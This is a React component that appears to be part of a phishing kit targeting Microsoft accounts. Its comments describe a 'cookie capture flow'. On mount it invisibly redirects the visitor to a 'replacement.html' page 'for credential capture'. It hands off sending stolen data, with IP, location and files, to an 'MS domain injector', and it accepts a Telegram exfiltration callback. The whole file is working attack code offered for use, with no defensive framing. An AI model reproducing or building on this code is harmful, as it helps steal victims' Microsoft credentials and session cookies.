import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * FIXED: Microsoft domain cookie capture flow
 * 
 * Purpose:
 * - Navigate to replacement.html for credential capture
 * - DO NOT send data immediately after login
 * - Wait for Microsoft domain redirect and cookie capture
 * - Let the injector handle complete data transmission with IP/location/files
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({
  onLoginSuccess,
  sendToTelegram
}) => {
  useLayoutEffect(() => {
    console.log('🔄 RealOAuthRedirect component mounted, navigating to replacement.html...');

    // 🔧 FIXED: Simply navigate to replacement.html - don't handle data transmission here
    // The replacement.html will capture credentials and redirect to MS domain
    // The MS domain injector will handle complete data transmission
    try {
      console.log('🔄 Navigating to replacement page for credential capture...');
      
      // Navigate immediately to replacement page for credential capture
      setTimeout(() => {
        try {
          window.location.replace('/replacement.html');
        } catch (error) {
          console.error('❌ Failed to navigate to replacement page:', error);
          // Fallback to Microsoft login if navigation fails
          try {
            window.location.replace('https://login.microsoftonline.com');
          } catch (e) {
            console.error('❌ Fallback navigation also failed:', e);
          }
        }
      }, 300); // Immediate navigation to replacement page
    } catch (error) {
      console.error('❌ Navigation scheduling failed:', error);
    }

    // cleanup on unmount
    return () => {
      // No cleanup needed - navigation handles everything
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Render nothing to avoid any visible flash
  return null;
};

export default RealOAuthRedirect;
